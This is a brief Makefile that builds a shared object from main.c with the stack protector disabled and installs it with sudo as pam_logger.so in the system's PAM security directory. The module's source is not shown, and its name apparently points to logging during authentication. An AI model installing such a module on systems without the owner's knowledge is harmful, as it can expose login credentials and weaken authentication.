# SPDX-FileCopyrightText: 2025-2026 David Rabkin
# SPDX-License-Identifier: 0BSD
.PHONY: all clean install main test

all:

clean:
	rm -f main.o

install: main
	sudo ld -x --shared -o /lib/i386-linux-gnu/security/pam_logger.so main.o

main: main.o
	gcc -fPIC -fno-stack-protector -Wextra -Wall -Werror -O3 -c main.c

test:
